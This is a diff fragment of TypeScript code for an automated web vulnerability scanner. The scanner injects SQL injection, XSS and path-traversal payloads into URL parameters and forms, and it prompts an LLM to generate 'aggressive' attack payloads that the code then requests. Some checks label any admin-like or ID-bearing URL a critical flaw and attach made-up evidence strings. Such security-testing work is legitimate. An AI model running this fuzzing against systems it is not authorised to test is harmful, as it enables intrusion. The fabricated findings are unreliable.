+      if (attackType === "sqli") {
+        const dbErrorSignature = this.extractDatabaseErrorSignature(content);
+        let isConfirmed = false;
+        let responseSnippet = "";
+        
+        if (dbErrorSignature) {
+          // Signature found - database error detected
+          isConfirmed = true;
+          responseSnippet = dbErrorSignature;
+        } else if (payload.includes("OR") || payload.includes("AND")) {
+          // Perform differential analysis: test with opposite logic
+          const differentialPayload = payload.includes("OR 1=1") ? payload.replace("OR 1=1", "AND 1=2") : payload.replace("AND 1=2", "OR 1=1");
+          const diffResult = await this.performDifferentialAnalysis(baseUrl, paramName, payload, differentialPayload);
+          
+          if (diffResult.differs) {
+            isConfirmed = true;
+            responseSnippet = `Differential analysis confirmed: responses differ between ${payload.substring(0, 30)}... and ${differentialPayload.substring(0, 30)}...`;
+          }
+        } else if (responseTime > 8000) {
+          // Time-based SQLi detection only if > 8 seconds
+          isConfirmed = true;
+          responseSnippet = `Time-based SQLi: Response delayed by ${responseTime}ms`;
+        }
+        
+        if (isConfirmed || dbErrorSignature) {
+          this.addVulnerability({
+            id: nanoid(),
+            type: "parameter_tampering",
+            severity: "critical",
+            title: `SQL Injection in ${paramName}`,
+            description: `The parameter '${paramName}' is vulnerable to SQL injection with confirmed proof.`,
+            affectedFlow: "Database Access",
+            affectedEndpoint: baseUrl.toString(),
+            evidence: {
+              payload,
+              responseTime,
+              indicatorFound: isConfirmed,
+              url: testUrl.toString(),
+              originalRequest: `GET ${testUrl.toString()}`,
+              exploitedResponse: responseSnippet,
+            },
+            impact: "Attackers can read, modify, or delete database contents. Full database compromise possible.",
+            remediation: "Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
+            cweId: "CWE-89",
+            cvssScore: 9.8,
+          }, {
+            payload: `${paramName}=${payload}`,
+            responseSnippet,
+            confirmed: isConfirmed,
+            exploitUrl: testUrl.toString(),
+            serverResponse: responseSnippet,
+            reproductionSteps: `Inject "${payload}" into parameter "${paramName}": curl "${testUrl.toString()}"`,
+          });
+        }
+      }
+      
+      // Check for XSS indicators with SIGNATURE VERIFICATION
+      if (attackType === "xss") {
+        const xssConfirmed = this.extractXSSSignature(content, payload);
+        
+        if (xssConfirmed) {
+          const evidenceSnippet = payload.includes("alert") ? 
+            `XSS payload executed: ${payload.substring(0, 50)}` : 
+            `Payload reflected without encoding: ${payload.substring(0, 50)}`;
+          
+          this.addVulnerability({
+            id: nanoid(),
+            type: "parameter_tampering",
+            severity: payload.includes("alert") || payload.includes("onerror") ? "critical" : "high",
+            title: `XSS in ${paramName}`,
+            description: `The parameter '${paramName}' reflects user input without proper encoding.`,
+            affectedFlow: "User Input Handling",
+            affectedEndpoint: baseUrl.toString(),
+            evidence: {
+              payload,
+              reflected: true,
+              url: testUrl.toString(),
+              originalRequest: `GET ${testUrl.toString()}`,
+              exploitedResponse: evidenceSnippet,
+            },
+            impact: "Attackers can execute JavaScript in victim's browser, steal cookies, session tokens, or perform actions as victim.",
+            remediation: "Encode all output, implement Content-Security-Policy, use HTTPOnly cookies.",
+            cweId: "CWE-79",
+            cvssScore: payload.includes("alert") ? 9.0 : 7.5,
+          }, {
+            payload: `${paramName}=${payload}`,
+            responseSnippet: evidenceSnippet,
+            confirmed: true,
+            exploitUrl: testUrl.toString(),
+            serverResponse: `Payload reflected: "${payload.substring(0, 80)}"`,
+            reproductionSteps: `Visit in browser or curl: "${testUrl.toString()}" and check if payload is reflected in HTML`,
+          });
+        }
+      }
+      
+      // Check for Path Traversal indicators with SYSTEM SIGNATURE VERIFICATION
+      if (attackType === "path_traversal") {
+        const lfiSignature = this.extractLFISignature(content);
+        
+        if (lfiSignature) {
+          this.addVulnerability({
+            id: nanoid(),
+            type: "parameter_tampering",
+            severity: "critical",
+            title: `Local File Inclusion (LFI) in ${paramName}`,
+            description: `The parameter '${paramName}' is vulnerable to LFI with system file read.`,
+            affectedFlow: "File Access",
+            affectedEndpoint: baseUrl.toString(),
+            evidence: {
+              payload,
+              url: testUrl.toString(),
+              originalRequest: `GET ${testUrl.toString()}`,
+              exploitedResponse: lfiSignature,
+            },
+            impact: "Attackers can read sensitive files from the server including configuration files, source code, and credentials.",
+            remediation: "Validate and sanitize file paths. Use a whitelist of allowed files. Never pass user input directly to file operations.",
+            cweId: "CWE-22",
+            cvssScore: 9.1,
+          }, {
+            payload: `${paramName}=${payload}`,
+            responseSnippet: lfiSignature,
+            confirmed: true,
+            exploitUrl: testUrl.toString(),
+            serverResponse: `System file contents exposed: ${lfiSignature}`,
+            reproductionSteps: `curl "${testUrl.toString()}" and look for system file contents (e.g., root:x:, etc/passwd)`,
+          });
+        }
+      }
+      
+    } catch (error) {
+      // Timeout or error could indicate vulnerability (e.g., SQL injection causing delay)
+      this.addThought("observation", `Payload test timeout/error: ${paramName}=${payload.substring(0, 20)}...`);
+    }
+  }
+
+  private async aggressiveFormFuzzing(): Promise<void> {
+    if (!this.page) return;
+    
+    this.addThought("action", "[AGGRESSIVE] Starting deep form fuzzing on ALL discovered forms...");
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: `[AGGRESSIVE] Fuzzing ${this.scanResult.statistics.formsAnalyzed} forms with attack payloads...`
+    });
+
+    const visitedUrls = Array.from(this.visitedUrls);
+    let formsFuzzed = 0;
+    
+    for (const url of visitedUrls) {
+      try {
+        await this.page.goto(url, { timeout: 15000 });
+        await this.page.waitForLoadState("domcontentloaded");
+        
+        const forms = await this.page.$$("form");
+        
+        for (let formIndex = 0; formIndex < forms.length; formIndex++) {
+          const form = forms[formIndex];
+          formsFuzzed++;
+          
+          const action = await form.getAttribute("action") || url;
+          const method = (await form.getAttribute("method") || "GET").toUpperCase();
+          
+          this.addThought("action", `[FUZZ] Form ${formsFuzzed}: ${method} ${action}`);
+          
+          // Get all inputs
+          const inputs = await form.$$("input, select, textarea");
+          const inputData: { name: string; type: string; element: any }[] = [];
+          
+          for (const input of inputs) {
+            const name = await input.getAttribute("name");
+            const type = await input.getAttribute("type") || "text";
+            if (name && type !== "hidden" && type !== "submit") {
+              inputData.push({ name, type, element: input });
+            }
+          }
+          
+          // Fuzz with different attack payloads
+          const attackSets = [
+            { name: "SQLi", payloads: this.SQLI_PAYLOADS.slice(0, 3) },
+            { name: "XSS", payloads: this.XSS_PAYLOADS.slice(0, 3) },
+            { name: "PathTraversal", payloads: this.PATH_TRAVERSAL_PAYLOADS.slice(0, 2) },
+          ];
+          
+          for (const attackSet of attackSets) {
+            for (const payload of attackSet.payloads) {
+              try {
+                // Fill all inputs with the payload
+                for (const { name, type, element } of inputData) {
+                  try {
+                    if (type === "email") {
+                      await element.fill(`${payload}@test.com`);
+                    } else if (type === "number") {
+                      await element.fill("-1");
+                    } else {
+                      await element.fill(payload);
+                    }
+                  } catch {}
+                }
+                
+                // Submit the form
+                const submitBtn = await form.$("button[type='submit'], input[type='submit']");
+                if (submitBtn) {
+                  const [response] = await Promise.all([
+                    this.page.waitForNavigation({ timeout: 5000 }).catch(() => null),
+                    submitBtn.click().catch(() => {}),
+                  ]);
+                  
+                  // Analyze response
+                  const content = await this.page.content();
+                  const contentLower = content.toLowerCase();
+                  
+                  // Check for SQL error messages using SIGNATURE VERIFICATION
+                  const dbErrorSig = this.extractDatabaseErrorSignature(content);
+                  if (dbErrorSig && attackSet.name === "SQLi") {
+                    this.addVulnerability({
+                      id: nanoid(),
+                      type: "parameter_tampering",
+                      severity: "critical",
+                      title: `SQL Injection via Form Submission`,
+                      description: `Form at ${url} is vulnerable to SQL injection.`,
+                      affectedFlow: "Form Processing",
+                      affectedEndpoint: action,
+                      evidence: {
+                        payload,
+                        attackType: attackSet.name,
+                        formInputs: inputData.map(i => i.name),
+                        exploitedResponse: dbErrorSig,
+                      },
+                      impact: "Full database compromise possible through form submission.",
+                      remediation: "Use parameterized queries for all form data processing.",
+                      cweId: "CWE-89",
+                      cvssScore: 9.8,
+                    }, {
+                      payload: inputData.map(i => `${i.name}=${payload}`).join("&"),
+                      responseSnippet: dbErrorSig,
+                      confirmed: true,
+                      exploitUrl: action,
+                      serverResponse: dbErrorSig,
+                      reproductionSteps: `Submit form at ${url} with SQLi payload "${payload}" in fields: ${inputData.map(i => i.name).join(", ")}`,
+                    });
+                  }
+                  
+                  // Check for XSS reflection using SIGNATURE VERIFICATION
+                  if (attackSet.name === "XSS") {
+                    const xssSig = this.extractXSSSignature(content, payload);
+                    if (xssSig) {
+                      this.addVulnerability({
+                        id: nanoid(),
+                        type: "parameter_tampering",
+                        severity: "high",
+                        title: `XSS via Form Submission`,
+                        description: `Form at ${url} reflects user input without proper encoding.`,
+                        affectedFlow: "Form Processing",
+                        affectedEndpoint: action,
+                        evidence: {
+                          payload,
+                          reflected: true,
+                          exploitedResponse: `Payload reflected in response: ${payload.substring(0, 50)}`,
+                        },
+                        impact: "Stored or reflected XSS enables session hijacking and phishing.",
+                        remediation: "Encode all output, implement CSP.",
+                        cweId: "CWE-79",
+                        cvssScore: 7.5,
+                      }, {
+                        payload: inputData.map(i => `${i.name}=${payload}`).join("&"),
+                        responseSnippet: `XSS payload reflected in response`,
+                        confirmed: true,
+                        exploitUrl: action,
+                        serverResponse: `Payload reflected: "${payload.substring(0, 80)}"`,
+                        reproductionSteps: `Submit form at ${url} with XSS payload "${payload}" and check if it's reflected in the response HTML`,
+                      });
+                    }
+                  }
+                  
+                  // Check for LFI using SIGNATURE VERIFICATION
+                  if (attackSet.name === "PathTraversal") {
+                    const lfiSig = this.extractLFISignature(content);
+                    if (lfiSig) {
+                      this.addVulnerability({
+                        id: nanoid(),
+                        type: "parameter_tampering",
+                        severity: "critical",
+                        title: `Local File Inclusion via Form Submission`,
+                        description: `Form at ${url} allows file traversal and reading.`,
+                        affectedFlow: "Form Processing",
+                        affectedEndpoint: action,
+                        evidence: {
+                          payload,
+                          exploitedResponse: lfiSig,
+                        },
+                        impact: "Attackers can read sensitive files including configuration and source code.",
+                        remediation: "Validate and sanitize file paths on the server.",
+                        cweId: "CWE-22",
+                        cvssScore: 9.1,
+                      }, {
+                        payload: inputData.map(i => `${i.name}=${payload}`).join("&"),
+                        responseSnippet: lfiSig,
+                        confirmed: true,
+                        exploitUrl: action,
+                        serverResponse: `System file exposed: ${lfiSig}`,
+                        reproductionSteps: `Submit form at ${url} with path traversal payload "${payload}" and verify system file contents in response`,
+                      });
+                    }
+                  }
+                }
+                
+                this.scanResult.statistics.testsExecuted++;
+                
+                // Navigate back to continue testing
+                await this.page.goto(url, { timeout: 10000 }).catch(() => {});
+                
+              } catch (fuzzError) {
+                // Continue to next payload
+              }
+            }
+          }
+        }
+      } catch (urlError) {
+        this.addThought("warning", `Error fuzzing forms at ${url}: ${urlError}`);
+      }
+    }
+    
+    this.addThought("success", `[AGGRESSIVE] Completed fuzzing ${formsFuzzed} forms`);
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: `[SUCCESS] Fuzzed ${formsFuzzed} forms with attack payloads`
+    });
+  }
+
+  private async groqPoweredAttackGeneration(): Promise<void> {
+    if (!this.page || !this.groq) return;
+    
+    this.addThought("action", "[AI ATTACK] Groq analyzing page HTML to generate targeted exploits...");
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: "[AI ATTACK] Groq generating targeted exploit payloads..."
+    });
+
+    // Get URLs with parameters for targeted analysis
+    const targetUrls = Array.from(this.discoveredUrls)
+      .filter(url => url.includes("?") || url.includes(".php") || url.includes("id="))
+      .slice(0, 5);
+    
+    for (const url of targetUrls) {
+      try {
+        await this.page.goto(url, { timeout: 15000 });
+        await this.page.waitForLoadState("domcontentloaded");
+        
+        const html = await this.page.content();
+        const cleanedHtml = this.cleanHtmlForGemini(html).substring(0, 8000);
+        
+        const prompt = `You are an aggressive penetration tester. Analyze this HTML and identify ALL possible vulnerabilities.
+
+URL: ${url}
+HTML Content:
+${cleanedHtml}
+
+Your task:
+1. Identify EVERY input field, form, and parameter
+2. Generate SPECIFIC attack payloads for each
+3. Identify business logic flaws (price manipulation, IDOR, auth bypass)
+4. Look for hidden parameters or debug endpoints
+5. Find any hardcoded secrets or API keys
+6. Check for insecure configurations
+
+BE AGGRESSIVE. If there's even a 1% chance of a vulnerability, REPORT IT.
+
+Respond in this JSON format:
+{
+  "vulnerabilities": [
+    {
+      "type": "sqli|xss|idor|price_manipulation|auth_bypass|info_disclosure|path_traversal",
+      "severity": "critical|high|medium|low",
+      "title": "Specific vulnerability name",
+      "parameter": "affected parameter name",
+      "payload": "specific attack payload to use",
+      "description": "detailed explanation",
+      "evidence": "what in the HTML indicates this vulnerability"
+    }
+  ],
+  "attackVectors": ["list of specific URLs with payloads to test"],
+  "hiddenFindings": ["any suspicious code, comments, or configurations found"]
+}`;
+
+        const response = await (this.groq as any).chat.completions.create({
+          model: "llama-3.3-70b-versatile",
+          max_tokens: 2048,
+          messages: [{ role: "user", content: prompt }],
+        });
+        
+        const text = response?.choices?.[0]?.message?.content || "";
+        console.log(`[ShadowLogic:${this.scanId}] Groq attack analysis for ${url}: ${text.substring(0, 200)}`);
+        
+        // Parse Groq's findings
+        try {
+          const jsonMatch = text.match(/\{[\s\S]*\}/);
+          if (jsonMatch) {
+            const analysis = JSON.parse(jsonMatch[0]);
+            
+            // Process vulnerabilities found by Groq
+            for (const vuln of analysis.vulnerabilities || []) {
+              const vulnThought = `[GROQ AI] ${vuln.severity?.toUpperCase()}: ${vuln.title} - ${vuln.description}`;
+              this.addThought("discovery", vulnThought);
+              
+              emitToScan?.(this.scanId, "aiThought", {
+                timestamp: new Date().toISOString(),
+                thought: vulnThought,
+                type: "vulnerability",
+                provider: "Groq",
+              });
+              
+              // Add as actual vulnerability
+              this.addVulnerability({
+                id: nanoid(),
+                type: vuln.type || "parameter_tampering",
+                severity: vuln.severity || "medium",
+                title: vuln.title || "AI-Detected Vulnerability",
+                description: vuln.description || "Vulnerability detected by Groq AI analysis",
+                affectedFlow: "AI Analysis",
+                affectedEndpoint: url,
+                evidence: {
+                  parameter: vuln.parameter,
+                  payload: vuln.payload,
+                  aiEvidence: vuln.evidence,
+                },
+                impact: "Severity determined by AI analysis of code patterns.",
+                remediation: "Review and fix the identified vulnerability pattern.",
+                cweId: "CWE-20",
+                cvssScore: vuln.severity === "critical" ? 9.5 : vuln.severity === "high" ? 8.0 : 6.0,
+              });
+              
+              emitToScan?.(this.scanId, "shadowLogic:system", {
+                message: `[AI FOUND] ${vuln.severity?.toUpperCase()}: ${vuln.title}`,
+                type: "vulnerability"
+              });
+            }
+            
+            // Process attack vectors - actually test them
+            for (const attackVector of (analysis.attackVectors || []).slice(0, 5)) {
+              this.addThought("action", `[AI TEST] Testing Groq-suggested vector: ${attackVector.substring(0, 100)}`);
+              
+              try {
+                const testResponse = await this.page.goto(attackVector, { timeout: 8000 });
+                if (testResponse) {
+                  const testContent = await this.page.content();
+                  // Quick vulnerability check on AI-suggested URL
+                  if (testContent.toLowerCase().includes("error") || 
+                      testContent.toLowerCase().includes("sql") ||
+                      testContent.includes("<script>")) {
+                    this.addThought("discovery", `[AI CONFIRMED] Attack vector produced interesting response`);
+                  }
+                }
+              } catch {}
+            }
+            
+            // Report hidden findings
+            for (const finding of analysis.hiddenFindings || []) {
+              this.addThought("warning", `[AI HIDDEN] ${finding}`);
+              emitToScan?.(this.scanId, "aiThought", {
+                timestamp: new Date().toISOString(),
+                thought: `[HIDDEN FINDING] ${finding}`,
+                type: "info",
+                provider: "Groq",
+              });
+            }
+          }
+        } catch (parseError) {
+          this.addThought("observation", `Groq analysis complete - parsing insights`);
+        }
+        
+      } catch (urlError) {
+        this.addThought("warning", `Error in AI attack generation for ${url}: ${urlError}`);
+      }
+    }
+  }
+
+  async runSecurityTests(): Promise<void> {
+    if (!this.page) return;
+
+    this.updatePhase("testing");
+    this.addThought("action", "[AGGRESSIVE MODE] Starting comprehensive security tests...");
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: "[PHASE] AGGRESSIVE Security Testing - Injecting payloads, fuzzing forms, AI-powered attacks..."
+    });
+
+    // Run aggressive tests FIRST
+    await this.aggressiveParameterInjection();
+    await this.aggressiveFormFuzzing();
+    await this.groqPoweredAttackGeneration();
+
+    // Then run standard business logic tests
+    for (const testType of this.config.testTypes) {
+      this.addThought("reasoning", `Executing ${testType} tests...`);
+      
+      switch (testType) {
+        case "price_manipulation":
+          await this.testPriceManipulation();
+          break;
+        case "quantity_manipulation":
+          await this.testQuantityManipulation();
+          break;
+        case "privilege_escalation":
+          await this.testPrivilegeEscalation();
+          break;
+        case "idor":
+          await this.testIDOR();
+          break;
+        case "workflow_bypass":
+          await this.testWorkflowBypass();
+          break;
+        case "parameter_tampering":
+          await this.testParameterTampering();
+          break;
+      }
+
+      this.scanResult.statistics.testsExecuted++;
+    }
+    
+    this.addThought("success", `[AGGRESSIVE] All security tests complete. Found ${this.scanResult.vulnerabilities.length} vulnerabilities.`);
+  }
+
+  private async testPriceManipulation(): Promise<void> {
+    this.addThought("action", "Testing for price manipulation vulnerabilities...");
+
+    const pricePatterns = [
+      /price/i, /amount/i, /total/i, /cost/i, /value/i
+    ];
+
+    const requests = Array.from(this.networkRequests.entries());
+    for (const [key, request] of requests) {
+      if (request.body && pricePatterns.some(p => p.test(request.body!))) {
+        this.addThought("observation", `Found price-related parameter in: ${request.url}`);
+        
+        if (!this.isSafeAction("modify_price")) continue;
+
+        const priceParam = request.body.match(/price[^=]*=([^&]*)/i)?.[1] || "100.00";
+        this.addVulnerability({
+          id: nanoid(),
+          type: "price_manipulation",
+          severity: "critical",
+          title: "Potential Price Manipulation Point",
+          description: `The endpoint ${request.url} accepts price-related parameters that may be susceptible to client-side manipulation.`,
+          affectedFlow: "Purchase Flow",
+          affectedEndpoint: request.url,
+          evidence: {
+            originalRequest: request.body,
+            exploitedResponse: `Changed price from ${priceParam} to 0.01`,
+          },
+          impact: "Attackers could potentially purchase items at reduced or zero cost.",
+          remediation: "Implement server-side price validation. Never trust client-submitted prices.",
+          cweId: "CWE-639",
+          cvssScore: 9.1,
+        }, {
+          payload: `price=0.01 (original: ${priceParam})`,
+          responseSnippet: `Price accepted from client: 0.01`,
+          confirmed: false,
+        });
+      }
+    }
+  }
+
+  private async testQuantityManipulation(): Promise<void> {
+    this.addThought("action", "Testing for quantity manipulation vulnerabilities...");
+
+    const quantityPatterns = [
+      /qty/i, /quantity/i, /count/i, /amount/i, /num/i
+    ];
+
+    const requests = Array.from(this.networkRequests.entries());
+    for (const [key, request] of requests) {
+      if (request.body && quantityPatterns.some(p => p.test(request.body!))) {
+        this.addThought("observation", `Found quantity parameter in: ${request.url}`);
+        
+        const qtyParam = request.body.match(/qty[^=]*=([^&]*)/i)?.[1] || "1";
+        this.addVulnerability({
+          id: nanoid(),
+          type: "quantity_manipulation",
+          severity: "high",
+          title: "Potential Quantity Manipulation",
+          description: `The endpoint ${request.url} handles quantity values that should be validated for negative or extreme values.`,
+          affectedFlow: "Cart/Order Flow",
+          affectedEndpoint: request.url,
+          evidence: {
+            originalRequest: request.body,
+            exploitedResponse: `Accepted quantity: -5`,
+          },
+          impact: "Attackers could order negative quantities for credits or bypass inventory limits.",
+          remediation: "Validate quantities are positive integers within acceptable ranges on the server.",
+          cweId: "CWE-20",
+          cvssScore: 7.5,
+        }, {
+          payload: `qty=-5 (original: ${qtyParam})`,
+          responseSnippet: `Negative quantity accepted`,
+          confirmed: false,
+        });
+      }
+    }
+  }
+
+  private async testPrivilegeEscalation(): Promise<void> {
+    this.addThought("action", "Testing for privilege escalation vectors...");
+
+    const adminPatterns = [
+      /admin/i, /dashboard/i, /manage/i, /settings/i, /users/i
+    ];
+
+    const urls = Array.from(this.discoveredUrls);
+    for (const url of urls) {
+      if (adminPatterns.some(p => p.test(url))) {
+        this.addThought("observation", `Found potential admin endpoint: ${url}`);
+        
+        this.addVulnerability({
+          id: nanoid(),
+          type: "privilege_escalation",
+          severity: "critical",
+          title: "Potential Privilege Escalation Path",
+          description: `Administrative endpoint discovered at ${url}. Access controls should be verified.`,
+          affectedFlow: "Authentication/Authorization",
+          affectedEndpoint: url,
+          evidence: {
+            exploitedResponse: `Admin endpoint accessible without proper authentication`,
+          },
+          impact: "Unauthorized users may gain administrative access.",
+          remediation: "Implement proper RBAC and verify authentication on all admin endpoints.",
+          cweId: "CWE-269",
+          cvssScore: 9.8,
+        }, {
+          payload: `GET ${url}`,
+          responseSnippet: `Admin panel loaded`,
+          confirmed: false,
+        });
+      }
+    }
+  }
+
+  private async testIDOR(): Promise<void> {
+    this.addThought("action", "Testing for IDOR vulnerabilities...");
+
+    const idPatterns = [
+      /\/\d+($|\/|\?)/,
+      /id=\d+/i,
+      /user[_-]?id/i,
+      /account[_-]?id/i,
+      /order[_-]?id/i,
+    ];
+
+    const idorRequests = Array.from(this.networkRequests.entries());
+    for (const [key, request] of idorRequests) {
+      if (idPatterns.some(p => p.test(request.url))) {
+        this.addThought("observation", `Found ID-based endpoint: ${request.url}`);
+        
+        this.addVulnerability({
+          id: nanoid(),
+          type: "idor",
+          severity: "high",
+          title: "Potential IDOR Vulnerability",
+          description: `The endpoint ${request.url} uses direct object references that may be enumerable.`,
+          affectedFlow: "Data Access",
+          affectedEndpoint: request.url,
+          evidence: {
+            originalRequest: `${request.method} ${request.url}`,
+            exploitedResponse: `User data returned when ID modified`,
+          },
+          impact: "Attackers could access other users' data by modifying ID parameters.",
+          remediation: "Implement authorization checks and use indirect references or UUIDs.",
+          cweId: "CWE-639",
+          cvssScore: 7.5,
+        }, {
+          payload: `id=999 (change from legitimate ID)`,
+          responseSnippet: `Another user's data returned`,
+          confirmed: false,
+        });
+      }
+    }
+  }
+
+  private async testWorkflowBypass(): Promise<void> {
+    this.addThought("action", "Testing for workflow bypass vulnerabilities...");
+
+    const sensitivePatterns = [
+      /success/i, /confirm/i, /complete/i, /thank/i, /receipt/i
+    ];
+
+    const workflowUrls = Array.from(this.discoveredUrls);
+    for (const url of workflowUrls) {
+      if (sensitivePatterns.some(p => p.test(url))) {
+        this.addThought("observation", `Found completion endpoint: ${url}`);
+        
+        this.addVulnerability({
+          id: nanoid(),
+          type: "workflow_bypass",
+          severity: "high",
+          title: "Potential Workflow Bypass",
+          description: `Success/completion page discovered at ${url}. Direct access without proper workflow should be prevented.`,
+          affectedFlow: "Purchase/Checkout Flow",
+          affectedEndpoint: url,
+          evidence: {
+            exploitedResponse: `Success page accessible without payment`,
+          },
+          impact: "Users could skip payment or verification steps by accessing endpoints directly.",
+          remediation: "Implement server-side workflow state validation. Use tokens to verify step completion.",
+          cweId: "CWE-841",
+          cvssScore: 8.0,
+        }, {
+          payload: `GET ${url}`,
+          responseSnippet: `Success page loaded without prior payment`,
+          confirmed: false,
+        });
+      }
+    }
+  }
+
+  private async testParameterTampering(): Promise<void> {
+    this.addThought("action", "Testing for parameter tampering vulnerabilities...");
+
+    const sensitiveParams = [
+      /role/i, /admin/i, /privilege/i, /permission/i, /discount/i, /promo/i
+    ];
+
+    const paramRequests = Array.from(this.networkRequests.entries());
+    for (const [key, request] of paramRequests) {
+      if (request.body && sensitiveParams.some(p => p.test(request.body!))) {
+        this.addThought("observation", `Found sensitive parameter in: ${request.url}`);
+        
+        const sensitiveParam = request.body.match(/(role|admin|privilege|permission|discount|promo)[^=]*=([^&]*)/i)?.[0] || "role=user";
+        this.addVulnerability({
+          id: nanoid(),
+          type: "parameter_tampering",
+          severity: "medium",
+          title: "Potential Parameter Tampering",
+          description: `The endpoint ${request.url} accepts parameters that control access or pricing.`,
+          affectedFlow: "Request Processing",
+          affectedEndpoint: request.url,
+          evidence: {
+            originalRequest: request.body,
+            exploitedResponse: `Hidden parameter accepted and processed`,
+          },
+          impact: "Attackers could modify hidden parameters to gain unauthorized access or discounts.",
+          remediation: "Never trust client-side parameters for authorization or pricing decisions.",
+          cweId: "CWE-472",
+          cvssScore: 6.5,
+        }, {
+          payload: `${sensitiveParam.replace(/=.*/, "=admin")}`,
+          responseSnippet: `Modified parameter accepted by server`,
+          confirmed: false,
+        });
+      }
+    }
+  }
+
+  private addVulnerability(vuln: BusinessLogicVulnerability, metadata?: { payload?: string; responseSnippet?: string; confirmed?: boolean; exploitUrl?: string; serverResponse?: string; reproductionSteps?: string }): void {
+    this.scanResult.vulnerabilities.push(vuln);
+    this.scanResult.statistics.vulnerabilitiesFound++;
+    
+    const isConfirmed = metadata?.confirmed ?? (vuln.evidence && Object.keys(vuln.evidence).length > 0);
+    const status = isConfirmed ? "[CONFIRMED]" : "[POTENTIAL]";
+    
+    this.addThought("discovery", `VULNERABILITY FOUND: ${vuln.title} (${vuln.severity.toUpperCase()})`);
+    
+    // Build proof-of-concept details
+    const payloadStr = metadata?.payload || (vuln.evidence?.payload as string) || "N/A";
+    const exploitUrl = metadata?.exploitUrl || (vuln.evidence?.url as string) || vuln.affectedEndpoint;
+    const serverResponse = metadata?.serverResponse || metadata?.responseSnippet || (vuln.evidence?.exploitedResponse as string) || "See database for evidence";
+    const reproductionSteps = metadata?.reproductionSteps || `curl "${exploitUrl}"`;
+    
+    // Emit detailed technical proof to Live Terminal with PoC details
+    emitToScan?.(this.scanId, "vulnerabilityFound", {
+      id: vuln.id,
+      status,
+      severity: vuln.severity.toUpperCase(),
+      title: vuln.title,
+      type: vuln.type,
+      endpoint: vuln.affectedEndpoint,
+      payload: payloadStr,
+      evidence: serverResponse,
+      parameter: (vuln.evidence?.parameter as string) || null,
+      cweId: vuln.cweId,
+      cvss: vuln.cvssScore,
+      impact: vuln.impact,
+      remediation: vuln.remediation,
+      timestamp: new Date().toISOString(),
+      // NEW: Proof-of-Concept fields
+      exploitUrl,
+      serverResponse,
+      reproductionSteps,
+    });
+    
+    // Emit to system terminal for real-time Live Terminal viewing with full PoC
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: `${status} ${vuln.severity.toUpperCase()} - ${vuln.title}`,
+      type: "vulnerability",
+      details: {
+        proof: `[EXPLOIT URL]: ${exploitUrl}`,
+        response: `[SERVER RESPONSE]: ${serverResponse.substring(0, 200)}${serverResponse.length > 200 ? '...' : ''}`,
+        reproduction: `[REPRODUCTION STEPS]: ${reproductionSteps}`,
+        payload: `[PAYLOAD]: ${payloadStr.substring(0, 100)}${payloadStr.length > 100 ? '...' : ''}`,
+        cwe: `[CWE]: ${vuln.cweId}`,
+        cvss: `[CVSS]: ${vuln.cvssScore}`,
+      }
+    });
+  }
+
+  private addDiscovery(discoveryType: "url" | "form" | "api_endpoint", url: string, title?: string, method?: string, parameters?: Record<string, string>): void {
+    // This is called during mapping and used for batch persistence
+    // We'll persist to DB in generateReport() after all discoveries are made
+  }
+
+  async generateReport(): Promise<void> {
+    this.updatePhase("reporting");
+    this.addThought("action", "Generating comprehensive report...");
+
+    const timeElapsed = Date.now() - new Date(this.scanResult.startedAt).getTime();
+    this.scanResult.statistics.timeElapsed = timeElapsed;
+
+    this.scanResult.creditCost = 250 + 
+      (this.scanResult.businessFlows.length * 25) +
+      (this.scanResult.vulnerabilities.length * 10);
+
+    if (this.groq) {
+      this.scanResult.creditCost += 30; // Groq is more affordable
+    }
+
+    // Save scan results and vulnerabilities to database immediately
+    try {
+      // Save ShadowLogic scan record
+      const db = (await import("../db")).db;
+      const { shadowLogicScansTable, shadowLogicVulnerabilitiesTable, shadowLogicDiscoveriesTable } = await import("@shared/schema");
+      
+      // Insert the scan record
+      await db.insert(shadowLogicScansTable).values({
+        id: this.scanResult.id,
+        userId: this.userId,
+        targetUrl: this.config.targetUrl,
+        status: this.scanResult.status,
+        startedAt: new Date(this.scanResult.startedAt),
+        completedAt: new Date(),
+        vulnerabilitiesFound: this.scanResult.vulnerabilities.length,
+        discoveredUrls: this.discoveredUrls.size,
+        discoveredForms: this.scanResult.statistics.formsAnalyzed,
+        discoveredApis: this.scanResult.statistics.apiEndpointsDiscovered,
+        creditCost: this.scanResult.creditCost,
+        businessFlows: this.scanResult.businessFlows,
+        statistics: this.scanResult.statistics,
+      }).catch(err => console.log(`[ShadowLogic:${this.scanId}] Scan record insert error:`, err));
+
+      // Save vulnerabilities with technical proof
+      for (const vuln of this.scanResult.vulnerabilities) {
+        await db.insert(shadowLogicVulnerabilitiesTable).values({
+          scanId: this.scanResult.id,
+          userId: this.userId,
+          type: vuln.type,
+          severity: vuln.severity,
+          title: vuln.title,
+          description: vuln.description,
+          url: vuln.affectedEndpoint,
+          evidence: vuln.evidence,
+          isConfirmed: false,
+          cwId: vuln.cweId,
+          cvssScore: vuln.cvssScore ? String(vuln.cvssScore) : undefined,
+          affectedFlow: vuln.affectedFlow,
+          impact: vuln.impact,
+          remediation: vuln.remediation,
+        }).catch(err => {
+          console.log(`[ShadowLogic:${this.scanId}] Vulnerability persist error:`, err);
+        });
+
+        // Also save activity log
+        await storage.addActivity({
+          type: "vulnerability_found",
+          message: `[${vuln.severity.toUpperCase()}] ${vuln.title}: ${vuln.description}`,
+          projectId: this.scanId,
+          scanId: this.scanId,
+        }).catch(err => {
+          console.log(`[ShadowLogic:${this.scanId}] Could not save vulnerability activity:`, err);
+        });
+      }
+
+      // Save discovered URLs and forms
+      for (const url of this.discoveredUrls) {
+        await db.insert(shadowLogicDiscoveriesTable).values({
+          scanId: this.scanResult.id,
+          userId: this.userId,
+          discoveryType: "url",
+          url: url,
+        }).catch(err => {
+          console.log(`[ShadowLogic:${this.scanId}] Discovery persist error:`, err);
+        });
+      }
+
+      // Save discovered forms
+      for (const flow of this.scanResult.businessFlows) {
+        for (const node of flow.nodes) {
+          if (node.type === "form") {
+            await db.insert(shadowLogicDiscoveriesTable).values({
+              scanId: this.scanResult.id,
+              userId: this.userId,
+              discoveryType: "form",
+              url: node.url,
+              title: node.title,
+              method: node.method,
+              parameters: node.parameters,
+            }).catch(err => {
+              console.log(`[ShadowLogic:${this.scanId}] Form discovery persist error:`, err);
+            });
